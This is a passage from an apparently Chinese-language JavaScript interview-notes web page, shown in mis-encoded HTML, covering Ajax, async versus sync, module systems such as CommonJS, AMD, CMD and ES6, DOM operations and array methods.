å±æ€§</li><li>åŠ¨æ€åˆ›å»º DOM æ–¹å¼</li><li>ä½¿ç”¨ setTimeout å»¶è¿Ÿæ–¹æ³•</li><li>è®© JS æœ€ååŠ è½½</li></ul><h2 id="Ajax-æ˜¯ä»€ä¹ˆ-å¦‚ä½•åˆ›å»ºä¸€ä¸ª-Ajaxï¼Ÿï¼ˆè§å®ç°ç¯‡æ‰‹å†™Ajaxï¼‰"><a href="#Ajax-æ˜¯ä»€ä¹ˆ-å¦‚ä½•åˆ›å»ºä¸€ä¸ª-Ajaxï¼Ÿï¼ˆè§å®ç°ç¯‡æ‰‹å†™Ajaxï¼‰" class="headerlink" title="Ajax æ˜¯ä»€ä¹ˆ? å¦‚ä½•åˆ›å»ºä¸€ä¸ª Ajaxï¼Ÿï¼ˆè§å®ç°ç¯‡æ‰‹å†™Ajaxï¼‰"></a>Ajax æ˜¯ä»€ä¹ˆ? å¦‚ä½•åˆ›å»ºä¸€ä¸ª Ajaxï¼Ÿï¼ˆè§å®ç°ç¯‡æ‰‹å†™Ajaxï¼‰</h2><p>Ajaxæ˜¯ Asynchronous JavaScript and XML çš„ç¼©å†™ï¼ŒæŒ‡çš„æ˜¯é€šè¿‡ JavaScript çš„å¼‚æ­¥é€šä¿¡ï¼Œä»æœåŠ¡å™¨è·å– XML æ–‡æ¡£ä»ä¸­æå–æ•°æ®ï¼Œå†æ›´æ–°å½“å‰ç½‘é¡µçš„å¯¹åº”éƒ¨åˆ†ï¼Œè€Œä¸ç”¨åˆ·æ–°æ•´ä¸ªç½‘é¡µã€‚å…·ä½“æ¥è¯´ï¼ŒAJAX åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ã€‚</p><ul><li>åˆ›å»º XMLHttpRequest å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªå¼‚æ­¥è°ƒç”¨å¯¹è±¡</li><li>åˆ›å»ºä¸€ä¸ªæ–°çš„ HTTP è¯·æ±‚ï¼Œå¹¶æŒ‡å®šè¯¥ HTTP è¯·æ±‚çš„æ–¹æ³•ã€URL åŠéªŒè¯ä¿¡æ¯</li><li>è®¾ç½®å“åº” HTTP è¯·æ±‚çŠ¶æ€å˜åŒ–çš„å‡½æ•°</li><li>å‘é€ HTTP è¯·æ±‚</li><li>è·å–å¼‚æ­¥è°ƒç”¨è¿”å›çš„æ•°æ®</li><li>ä½¿ç”¨ JavaScript å’Œ DOM å®ç°å±€éƒ¨åˆ·æ–°</li></ul><h2 id="å¹¶å‘ï¼ˆconcurrencyï¼‰å’Œå¹¶è¡Œï¼ˆparallelismï¼‰åŒºåˆ«ï¼Ÿ"><a href="#å¹¶å‘ï¼ˆconcurrencyï¼‰å’Œå¹¶è¡Œï¼ˆparallelismï¼‰åŒºåˆ«ï¼Ÿ" class="headerlink" title="å¹¶å‘ï¼ˆconcurrencyï¼‰å’Œå¹¶è¡Œï¼ˆparallelismï¼‰åŒºåˆ«ï¼Ÿ"></a>å¹¶å‘ï¼ˆconcurrencyï¼‰å’Œå¹¶è¡Œï¼ˆparallelismï¼‰åŒºåˆ«ï¼Ÿ</h2><p>å¹¶å‘æ˜¯å®è§‚æ¦‚å¿µï¼Œåˆ†åˆ«æœ‰ä»»åŠ¡ A å’Œä»»åŠ¡ Bï¼Œåœ¨ä¸€æ®µæ—¶é—´å†…é€šè¿‡ä»»åŠ¡é—´çš„åˆ‡æ¢å®Œæˆäº†è¿™ä¸¤ä¸ªä»»åŠ¡ï¼Œè¿™ç§æƒ…å†µå°±å¯ä»¥ç§°ä¹‹ä¸ºå¹¶å‘ã€‚</p><p>å¹¶è¡Œæ˜¯å¾®è§‚æ¦‚å¿µï¼Œå‡è®¾ CPU ä¸­å­˜åœ¨ä¸¤ä¸ªæ ¸å¿ƒï¼Œé‚£ä¹ˆå°±å¯ä»¥åŒæ—¶å®Œæˆä»»åŠ¡ Aã€Bã€‚åŒæ—¶å®Œæˆå¤šä¸ªä»»åŠ¡çš„æƒ…å†µå°±å¯ä»¥ç§°ä¹‹ä¸ºå¹¶è¡Œã€‚</p><h2 id="åŒæ­¥å’Œå¼‚æ­¥çš„åŒºåˆ«ï¼Ÿ"><a href="#åŒæ­¥å’Œå¼‚æ­¥çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="åŒæ­¥å’Œå¼‚æ­¥çš„åŒºåˆ«ï¼Ÿ"></a>åŒæ­¥å’Œå¼‚æ­¥çš„åŒºåˆ«ï¼Ÿ</h2><p>åŒæ­¥ï¼šæ‰§è¡Œå®Œå‡½æ•°æˆ–æ–¹æ³•åï¼Œä¸€ç›´ç­‰å¾…ç³»ç»Ÿè¿”å›å€¼æˆ–æ¶ˆæ¯ã€‚è¿™æ—¶ç¨‹åºæ˜¯é˜»å¡çš„ï¼Œåªæœ‰æ¥æ”¶åˆ°è¿”å›çš„å€¼æˆ–æ¶ˆæ¯åæ‰å¾€ä¸‹æ‰§è¡Œå…¶ä»–çš„å‘½ä»¤ã€‚  </p><p>å¼‚æ­¥ï¼šæ‰§è¡Œå®Œå‡½æ•°æˆ–æ–¹æ³•åï¼Œä¸å¿…é˜»å¡æ€§åœ°ç­‰å¾…è¿”å›å€¼æˆ–æ¶ˆæ¯ï¼Œåªéœ€è¦å‘ç³»ç»Ÿå§”æ‰˜ä¸€ä¸ªå¼‚æ­¥è¿‡ç¨‹ï¼Œé‚£ä¹ˆå½“ç³»ç»Ÿæ¥æ”¶åˆ°è¿”å›å€¼æˆ–æ¶ˆæ¯æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§¦å‘å§”æ‰˜çš„å¼‚æ­¥è¿‡ç¨‹ï¼Œä»è€Œå®Œæˆä¸€ä¸ªå®Œæ•´çš„æµç¨‹ã€‚ </p><h2 id="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ¨¡å—åŒ–å¼€å‘ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ¨¡å—åŒ–å¼€å‘ï¼Ÿ" class="headerlink" title="*ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ¨¡å—åŒ–å¼€å‘ï¼Ÿ"></a>*ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ¨¡å—åŒ–å¼€å‘ï¼Ÿ</h2><p>è¿‡ç¨‹ï¼š</p><ul><li><p>ä¸€ä¸ªæ¨¡å—æ˜¯å®ç°ä¸€ä¸ªç‰¹å®šåŠŸèƒ½çš„ä¸€ç»„æ–¹æ³•ã€‚ç”±äºå‡½æ•°å…·æœ‰ç‹¬ç«‹ä½œç”¨åŸŸçš„ç‰¹ç‚¹ï¼Œæœ€åŸå§‹çš„å†™æ³•æ˜¯ä½¿ç”¨å‡½æ•°æ¥ä½œä¸ºæ¨¡å—ï¼Œå‡ ä¸ªå‡½æ•°ä½œä¸ºä¸€ä¸ªæ¨¡å—ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å®¹æ˜“é€ æˆå…¨å±€å˜é‡çš„æ±¡æŸ“ï¼Œå¹¶ä¸”æ¨¡å—é—´æ²¡æœ‰è”ç³»ã€‚</p></li><li><p>åé¢æå‡ºäº†å¯¹è±¡å†™æ³•ï¼Œé€šè¿‡å°†å‡½æ•°ä½œä¸ºä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•æ¥å®ç°ï¼Œè¿™æ ·è§£å†³äº†ç›´æ¥ä½¿ç”¨å‡½æ•°ä½œä¸ºæ¨¡å—çš„ä¸€äº›ç¼ºç‚¹ï¼Œä½†æ˜¯è¿™ç§åŠæ³•ä¼šæš´éœ²æ‰€æœ‰çš„æ¨¡å—æˆå‘˜ï¼Œå¤–éƒ¨ä»£ç å¯ä»¥ä¿®æ”¹å†…éƒ¨å±æ€§çš„å€¼ã€‚</p></li><li><p>ä½¿ç”¨ç«‹å³æ‰§è¡Œå‡½æ•°å®ç°æ¨¡å—åŒ–æ˜¯å¸¸è§çš„æ‰‹æ®µï¼Œé€šè¿‡åˆ©ç”¨é—­åŒ…æ¥å®ç°æ¨¡å—ç§æœ‰ä½œç”¨åŸŸçš„å»ºç«‹ï¼Œè§£å†³äº†å‘½åå†²çªã€æ±¡æŸ“å…¨å±€ä½œç”¨åŸŸçš„é—®é¢˜ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">globalVariable</span>)</span>&#123;</span><br><span class="line">   globalVariable.test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">   <span class="comment">// ... å£°æ˜å„ç§å˜é‡ã€å‡½æ•°éƒ½ä¸ä¼šæ±¡æŸ“å…¨å±€ä½œç”¨åŸŸ</span></span><br><span class="line">&#125;)(globalVariable)</span><br></pre></td></tr></table></figure></li></ul><p>ä½¿ç”¨æ¨¡å—åŒ–å¥½å¤„ï¼š</p><ul><li>è§£å†³å‘½åå†²çª</li><li>æä¾›å¤ç”¨æ€§</li><li>æé«˜ä»£ç å¯ç»´æŠ¤æ€§</li></ul><h2 id="js-çš„å‡ ç§æ¨¡å—è§„èŒƒï¼Ÿ"><a href="#js-çš„å‡ ç§æ¨¡å—è§„èŒƒï¼Ÿ" class="headerlink" title="* js çš„å‡ ç§æ¨¡å—è§„èŒƒï¼Ÿ"></a>* js çš„å‡ ç§æ¨¡å—è§„èŒƒï¼Ÿ</h2><p>js ä¸­ç°åœ¨æ¯”è¾ƒæˆç†Ÿçš„æœ‰å››ç§æ¨¡å—åŠ è½½æ–¹æ¡ˆã€‚</p><ul><li><p>CommonJS æ–¹æ¡ˆï¼Œå®ƒé€šè¿‡ require æ¥å¼•å…¥æ¨¡å—ï¼Œé€šè¿‡ <code>module.exports</code> å®šä¹‰æ¨¡å—çš„è¾“å‡ºæ¥å£ã€‚è¿™ç§æ¨¡å—åŠ è½½æ–¹æ¡ˆæ˜¯æœåŠ¡å™¨ç«¯çš„è§£å†³æ–¹æ¡ˆï¼Œä»¥åŒæ­¥çš„æ–¹å¼æ¥å¼•å…¥æ¨¡å—ï¼Œå› ä¸ºåœ¨æœåŠ¡ç«¯æ–‡ä»¶éƒ½å­˜å‚¨åœ¨æœ¬åœ°ç£ç›˜ï¼Œæ‰€ä»¥è¯»å–éå¸¸å¿«ï¼Œä»¥åŒæ­¥çš„æ–¹å¼åŠ è½½æ²¡æœ‰é—®é¢˜ã€‚ä½†å¦‚æœæ˜¯åœ¨æµè§ˆå™¨ç«¯ï¼Œç”±äºæ¨¡å—çš„åŠ è½½æ˜¯ä½¿ç”¨ç½‘ç»œè¯·æ±‚ï¼Œå› æ­¤ä½¿ç”¨å¼‚æ­¥åŠ è½½çš„æ–¹å¼æ›´åŠ åˆé€‚ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// or </span></span><br><span class="line"><span class="built_in">exports</span>.a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">module</span> = <span class="built_in">require</span>(<span class="string">&#x27;./a.js&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.a <span class="comment">// -&gt; log 1</span></span><br></pre></td></tr></table></figure></li><li><p>AMD æ–¹æ¡ˆï¼Œè¿™ç§æ–¹æ¡ˆé‡‡ç”¨å¼‚æ­¥åŠ è½½çš„æ–¹å¼æ¥åŠ è½½æ¨¡å—ï¼Œæ¨¡å—çš„åŠ è½½ä¸å½±å“åé¢è¯­å¥çš„æ‰§è¡Œï¼Œæ‰€æœ‰ä¾èµ–è¿™ä¸ªæ¨¡å—çš„è¯­å¥éƒ½å®šä¹‰åœ¨ä¸€ä¸ªå›è°ƒå‡½æ•°é‡Œï¼Œç­‰åˆ°åŠ è½½å®Œæˆåå†æ‰§è¡Œå›è°ƒå‡½æ•°ã€‚require.js å®ç°äº† AMD è§„èŒƒã€‚</p></li><li><p>CMD æ–¹æ¡ˆï¼Œè¿™ç§æ–¹æ¡ˆå’Œ AMD æ–¹æ¡ˆéƒ½æ˜¯ä¸ºäº†è§£å†³å¼‚æ­¥æ¨¡å—åŠ è½½çš„é—®é¢˜ï¼Œsea.js å®ç°äº† CMD è§„èŒƒã€‚å®ƒå’Œ require.jsçš„åŒºåˆ«åœ¨äºæ¨¡å—å®šä¹‰æ—¶å¯¹ä¾èµ–çš„å¤„ç†ä¸åŒå’Œå¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºçš„å¤„ç†ä¸åŒã€‚</p></li><li><p> ES6 æå‡ºçš„æ–¹æ¡ˆï¼Œä½¿ç”¨ import å’Œ export çš„å½¢å¼æ¥å¯¼å…¥å¯¼å‡ºæ¨¡å—ã€‚è¿™ç§æ–¹æ¡ˆå’Œä¸Šé¢ä¸‰ç§æ–¹æ¡ˆéƒ½ä¸åŒã€‚</p></li></ul><h2 id="AMD-å’Œ-CMD-è§„èŒƒçš„åŒºåˆ«ï¼Ÿ"><a href="#AMD-å’Œ-CMD-è§„èŒƒçš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="* AMD å’Œ CMD è§„èŒƒçš„åŒºåˆ«ï¼Ÿ"></a>* AMD å’Œ CMD è§„èŒƒçš„åŒºåˆ«ï¼Ÿ</h2><p>å®ƒä»¬ä¹‹é—´çš„ä¸»è¦åŒºåˆ«æœ‰ä¸¤ä¸ªæ–¹é¢ã€‚</p><p>ï¼ˆ1ï¼‰åœ¨æ¨¡å—å®šä¹‰æ—¶å¯¹ä¾èµ–çš„å¤„ç†ä¸åŒã€‚AMD æ¨å´‡ä¾èµ–å‰ç½®ï¼Œåœ¨å®šä¹‰æ¨¡å—çš„æ—¶å€™å°±è¦å£°æ˜å…¶ä¾èµ–çš„æ¨¡å—ã€‚è€Œ CMD æ¨å´‡å°±è¿‘ä¾èµ–ï¼Œåªæœ‰åœ¨ç”¨åˆ°æŸä¸ªæ¨¡å—çš„æ—¶å€™å†å» require ã€‚</p><p>ï¼ˆ2ï¼‰å¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºå¤„ç†ä¸åŒã€‚é¦–å…ˆ AMD å’Œ CMD å¯¹äºæ¨¡å—çš„åŠ è½½æ–¹å¼éƒ½æ˜¯å¼‚æ­¥åŠ è½½ï¼Œä¸è¿‡å®ƒä»¬çš„åŒºåˆ«åœ¨äº æ¨¡å—çš„æ‰§è¡Œæ—¶æœºï¼ŒAMD åœ¨ä¾èµ–æ¨¡å—åŠ è½½å®Œæˆåå°±ç›´æ¥æ‰§è¡Œä¾èµ–æ¨¡å—ï¼Œä¾èµ–æ¨¡å—çš„æ‰§è¡Œé¡ºåºå’Œæˆ‘ä»¬ä¹¦å†™çš„é¡ºåºä¸ä¸€å®šä¸€è‡´ã€‚è€Œ CMD åœ¨ä¾èµ–æ¨¡å—åŠ è½½å®Œæˆåå¹¶ä¸æ‰§è¡Œï¼Œåªæ˜¯ä¸‹è½½è€Œå·²ï¼Œç­‰åˆ°æ‰€æœ‰çš„ä¾èµ–æ¨¡å—éƒ½åŠ è½½å¥½åï¼Œè¿›å…¥å›è°ƒå‡½æ•°é€»è¾‘ï¼Œé‡åˆ° require è¯­å¥çš„æ—¶å€™æ‰æ‰§è¡Œå¯¹åº”çš„æ¨¡å—ï¼Œè¿™æ ·æ¨¡å—çš„æ‰§è¡Œé¡ºåºå°±å’Œæˆ‘ä»¬ä¹¦å†™çš„é¡ºåºä¿æŒä¸€è‡´äº†ã€‚</p><h2 id="ES6-æ¨¡å—ä¸-CommonJS-æ¨¡å—ã€AMDã€CMD-çš„å·®å¼‚ã€‚"><a href="#ES6-æ¨¡å—ä¸-CommonJS-æ¨¡å—ã€AMDã€CMD-çš„å·®å¼‚ã€‚" class="headerlink" title="* ES6 æ¨¡å—ä¸ CommonJS æ¨¡å—ã€AMDã€CMD çš„å·®å¼‚ã€‚"></a>* ES6 æ¨¡å—ä¸ CommonJS æ¨¡å—ã€AMDã€CMD çš„å·®å¼‚ã€‚</h2><ul><li>CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒES6 æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ã€‚CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„æ‹·è´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦è¾“å‡ºä¸€ä¸ªå€¼ï¼Œæ¨¡å—å†…éƒ¨çš„å˜åŒ–å°±å½±å“ä¸åˆ°è¿™ä¸ªå€¼ã€‚ES6 æ¨¡å—çš„è¿è¡Œæœºåˆ¶ä¸ CommonJS ä¸ä¸€æ ·ã€‚JS å¼•æ“å¯¹è„šæœ¬é™æ€åˆ†æçš„æ—¶å€™ï¼Œé‡åˆ°æ¨¡å—åŠ è½½å‘½ä»¤ importï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªåªè¯»å¼•ç”¨ã€‚ç­‰åˆ°è„šæœ¬çœŸæ­£æ‰§è¡Œæ—¶ï¼Œå†æ ¹æ®è¿™ä¸ªåªè¯»å¼•ç”¨ï¼Œåˆ°è¢«åŠ è½½çš„é‚£ä¸ªæ¨¡å—é‡Œé¢å»å–å€¼ã€‚</li><li>CommonJS æ¨¡å—æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒES6 æ¨¡å—æ˜¯ç¼–è¯‘æ—¶è¾“å‡ºæ¥å£ã€‚CommonJS æ¨¡å—å°±æ˜¯å¯¹è±¡ï¼Œå³åœ¨è¾“å…¥æ—¶æ˜¯å…ˆåŠ è½½æ•´ä¸ªæ¨¡å—ï¼Œç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†ä»è¿™ä¸ªå¯¹è±¡ä¸Šé¢è¯»å–æ–¹æ³•ï¼Œè¿™ç§åŠ è½½ç§°ä¸ºâ€œè¿è¡Œæ—¶åŠ è½½â€ã€‚è€Œ ES6 æ¨¡å—ä¸æ˜¯å¯¹è±¡ï¼Œå®ƒçš„å¯¹å¤–æ¥å£åªæ˜¯ä¸€ç§é™æ€å®šä¹‰ï¼Œåœ¨ä»£ç é™æ€è§£æé˜¶æ®µå°±ä¼šç”Ÿæˆã€‚</li></ul><h2 id="requireJS-çš„æ ¸å¿ƒåŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå¦‚ä½•åŠ¨æ€åŠ è½½çš„ï¼Ÿå¦‚ä½•é¿å…å¤šæ¬¡åŠ è½½çš„ï¼Ÿå¦‚ä½•-ç¼“å­˜çš„ï¼Ÿï¼‰"><a href="#requireJS-çš„æ ¸å¿ƒåŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå¦‚ä½•åŠ¨æ€åŠ è½½çš„ï¼Ÿå¦‚ä½•é¿å…å¤šæ¬¡åŠ è½½çš„ï¼Ÿå¦‚ä½•-ç¼“å­˜çš„ï¼Ÿï¼‰" class="headerlink" title="* requireJS çš„æ ¸å¿ƒåŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå¦‚ä½•åŠ¨æ€åŠ è½½çš„ï¼Ÿå¦‚ä½•é¿å…å¤šæ¬¡åŠ è½½çš„ï¼Ÿå¦‚ä½• ç¼“å­˜çš„ï¼Ÿï¼‰"></a>* requireJS çš„æ ¸å¿ƒåŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå¦‚ä½•åŠ¨æ€åŠ è½½çš„ï¼Ÿå¦‚ä½•é¿å…å¤šæ¬¡åŠ è½½çš„ï¼Ÿå¦‚ä½• ç¼“å­˜çš„ï¼Ÿï¼‰</h2><p>require.js çš„æ ¸å¿ƒåŸç†æ˜¯é€šè¿‡åŠ¨æ€åˆ›å»º script è„šæœ¬æ¥å¼‚æ­¥å¼•å…¥æ¨¡å—ï¼Œç„¶åå¯¹æ¯ä¸ªè„šæœ¬çš„ load äº‹ä»¶è¿›è¡Œç›‘å¬ï¼Œå¦‚æœæ¯ä¸ªè„šæœ¬éƒ½åŠ è½½å®Œæˆäº†ï¼Œå†è°ƒç”¨å›è°ƒå‡½æ•°ã€‚</p><h2 id="documen-write-å’Œ-innerHTML-çš„åŒºåˆ«ï¼Ÿ"><a href="#documen-write-å’Œ-innerHTML-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="documen.write å’Œ innerHTML çš„åŒºåˆ«ï¼Ÿ"></a>documen.write å’Œ innerHTML çš„åŒºåˆ«ï¼Ÿ</h2><ul><li><p>document.write çš„å†…å®¹ä¼šä»£æ›¿æ•´ä¸ªæ–‡æ¡£å†…å®¹ï¼Œä¼šé‡å†™æ•´ä¸ªé¡µé¢ã€‚</p></li><li><p>innerHTML çš„å†…å®¹åªæ˜¯æ›¿ä»£æŒ‡å®šå…ƒç´ çš„å†…å®¹ï¼Œåªä¼šé‡å†™é¡µé¢ä¸­çš„éƒ¨åˆ†å†…å®¹ã€‚</p></li></ul><h2 id="DOM-æ“ä½œâ€”â€”æ€æ ·æ·»åŠ ã€ç§»é™¤ã€ç§»åŠ¨ã€å¤åˆ¶ã€åˆ›å»ºå’ŒæŸ¥æ‰¾èŠ‚ç‚¹ï¼Ÿ"><a href="#DOM-æ“ä½œâ€”â€”æ€æ ·æ·»åŠ ã€ç§»é™¤ã€ç§»åŠ¨ã€å¤åˆ¶ã€åˆ›å»ºå’ŒæŸ¥æ‰¾èŠ‚ç‚¹ï¼Ÿ" class="headerlink" title="DOM æ“ä½œâ€”â€”æ€æ ·æ·»åŠ ã€ç§»é™¤ã€ç§»åŠ¨ã€å¤åˆ¶ã€åˆ›å»ºå’ŒæŸ¥æ‰¾èŠ‚ç‚¹ï¼Ÿ"></a>DOM æ“ä½œâ€”â€”æ€æ ·æ·»åŠ ã€ç§»é™¤ã€ç§»åŠ¨ã€å¤åˆ¶ã€åˆ›å»ºå’ŒæŸ¥æ‰¾èŠ‚ç‚¹ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰åˆ›å»ºæ–°èŠ‚ç‚¹</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">createDocumentFragment(node);</span><br><span class="line">createElement(node);</span><br><span class="line">createTextNode(text);</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ·»åŠ ã€ç§»é™¤ã€æ›¿æ¢ã€æ’å…¥</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">appendChild(node)</span><br><span class="line">removeChild(node)</span><br><span class="line">replaceChild(<span class="keyword">new</span>,old)</span><br><span class="line">insertBefore(<span class="keyword">new</span>,old)</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æŸ¥æ‰¾</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getElementById();</span><br><span class="line">getElementsByName();</span><br><span class="line">getElementsByTagName();</span><br><span class="line">getElementsByClassName();</span><br><span class="line">querySelector();</span><br><span class="line">querySelectorAll();</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å±æ€§æ“ä½œ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getAttribute(key);</span><br><span class="line">setAttribute(key, value);</span><br><span class="line">hasAttribute(key);</span><br><span class="line">removeAttribute(key);</span><br></pre></td></tr></table></figure><h2 id="innerHTML-ä¸-outerHTML-çš„åŒºåˆ«ï¼Ÿ"><a href="#innerHTML-ä¸-outerHTML-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="innerHTML ä¸ outerHTML çš„åŒºåˆ«ï¼Ÿ"></a>innerHTML ä¸ outerHTML çš„åŒºåˆ«ï¼Ÿ</h2><p>å¯¹äºè¿™æ ·ä¸€ä¸ª HTML å…ƒç´ ï¼š<code>&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;</code>ã€‚</p><p>innerHTMLï¼šå†…éƒ¨ HTMLï¼Œ<code>content&lt;br/&gt;</code>ï¼›<br>outerHTMLï¼šå¤–éƒ¨ HTMLï¼Œ<code>&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;</code>ï¼›<br>innerTextï¼šå†…éƒ¨æ–‡æœ¬ï¼Œ<code>content</code> ï¼›<br>outerTextï¼šå†…éƒ¨æ–‡æœ¬ï¼Œ<code>content</code> ï¼›</p><h2 id="JavaScript-ç±»æ•°ç»„å¯¹è±¡çš„å®šä¹‰ï¼Ÿ"><a href="#JavaScript-ç±»æ•°ç»„å¯¹è±¡çš„å®šä¹‰ï¼Ÿ" class="headerlink" title="JavaScript ç±»æ•°ç»„å¯¹è±¡çš„å®šä¹‰ï¼Ÿ"></a>JavaScript ç±»æ•°ç»„å¯¹è±¡çš„å®šä¹‰ï¼Ÿ</h2><p>ä¸€ä¸ªæ‹¥æœ‰ length å±æ€§å’Œè‹¥å¹²ç´¢å¼•å±æ€§çš„å¯¹è±¡å°±å¯ä»¥è¢«ç§°ä¸ºç±»æ•°ç»„å¯¹è±¡ï¼Œç±»æ•°ç»„å¯¹è±¡å’Œæ•°ç»„ç±»ä¼¼ï¼Œä½†æ˜¯ä¸èƒ½è°ƒç”¨æ•°ç»„çš„æ–¹æ³•ã€‚</p><p>å¸¸è§çš„ç±»æ•°ç»„å¯¹è±¡æœ‰ <strong>arguments</strong> å’Œ <strong>DOM æ–¹æ³•çš„è¿”å›ç»“æœ</strong>ï¼Œ<strong>ä¸€ä¸ªå‡½æ•°</strong>ä¹Ÿå¯ä»¥è¢«çœ‹ä½œæ˜¯ç±»æ•°ç»„å¯¹è±¡ï¼Œå› ä¸ºå®ƒå«æœ‰ lengthå±æ€§å€¼ï¼Œä»£è¡¨å¯æ¥æ”¶çš„å‚æ•°ä¸ªæ•°ã€‚å¸¸è§çš„ç±»æ•°ç»„è½¬æ¢ä¸ºæ•°ç»„çš„æ–¹æ³•æœ‰è¿™æ ·å‡ ç§ï¼š</p><p>ï¼ˆ1ï¼‰é€šè¿‡ call è°ƒç”¨æ•°ç»„çš„ slice æ–¹æ³•æ¥å®ç°è½¬æ¢ <code>Array.prototype.slice.call(arrayLike);</code>ã€‚</p><p>ï¼ˆ2ï¼‰é€šè¿‡ call è°ƒç”¨æ•°ç»„çš„ splice æ–¹æ³•æ¥å®ç°è½¬æ¢ <code>Array.prototype.splice.call(arrayLike, 0);</code>ã€‚</p><p>ï¼ˆ3ï¼‰é€šè¿‡ apply è°ƒç”¨æ•°ç»„çš„ concat æ–¹æ³•æ¥å®ç°è½¬æ¢ <code>Array.prototype.concat.apply([], arrayLike);</code>ã€‚</p><p>ï¼ˆ4ï¼‰é€šè¿‡ Array.from æ–¹æ³•æ¥å®ç°è½¬æ¢ <code>Array.from(arrayLike);</code>ã€‚</p><h2 id="æ•°ç»„æœ‰å“ªäº›åŸç”Ÿæ–¹æ³•ï¼Ÿ"><a href="#æ•°ç»„æœ‰å“ªäº›åŸç”Ÿæ–¹æ³•ï¼Ÿ" class="headerlink" title="æ•°ç»„æœ‰å“ªäº›åŸç”Ÿæ–¹æ³•ï¼Ÿ"></a>æ•°ç»„æœ‰å“ªäº›åŸç”Ÿæ–¹æ³•ï¼Ÿ</h2><p><img src="https://i.loli.net/2021/07/21/vej1Ao59BbQqwTt.jpg" alt="Snipaste_2021-07-21_13-12-00.jpg"></p><h3 id="map-filter-reduce-å„è‡ªæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#map-filter-reduce-å„è‡ªæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="map, filter, reduce å„è‡ªæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a>map, filter, reduce å„è‡ªæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</h3><p><code>map</code> ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªæ–°æ•°ç»„ï¼Œéå†åŸæ•°ç»„ï¼Œå°†æ¯ä¸ªå…ƒç´ æ‹¿å‡ºæ¥åšä¸€äº›å˜æ¢ç„¶åæ”¾å…¥åˆ°æ–°çš„æ•°ç»„ä¸­ã€‚</p><p><code>filter</code> ä½œç”¨ä¹Ÿæ˜¯ç”Ÿæˆä¸€ä¸ªæ–°æ•°ç»„ï¼Œåœ¨éå†æ•°ç»„çš„æ—¶å€™å°†è¿”å›å€¼ä¸º <code>true</code> çš„å…ƒç´ æ”¾å…¥æ–°æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°åˆ é™¤ä¸€äº›ä¸éœ€è¦çš„å…ƒç´ ã€‚</p><p><code>reduce</code> å¯ä»¥å°†æ•°ç»„ä¸­çš„å…ƒç´ é€šè¿‡å›è°ƒå‡½æ•°æœ€ç»ˆè½¬æ¢ä¸ºä¸€ä¸ªå€¼ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯å›è°ƒå‡½æ•°å’Œåˆå§‹å€¼ã€‚å…·ä½“ç”¨æ³•è§ <a href="https://juejin.cn/post/6844904063729926152">25ä¸ªä½ ä¸å¾—ä¸çŸ¥é“çš„æ•°ç»„reduceé«˜çº§ç”¨æ³•</a>ã€‚</p><h2 id="çš„é•¿åº¦ï¼Ÿ"><a href="#çš„é•¿åº¦ï¼Ÿ" class="headerlink" title="[,,,] çš„é•¿åº¦ï¼Ÿ"></a>[,,,] çš„é•¿åº¦ï¼Ÿ</h2><p>å°¾åé€—å· ï¼ˆæœ‰æ—¶å«åšâ€œç»ˆæ­¢é€—å·â€ï¼‰åœ¨å‘ JavaScript 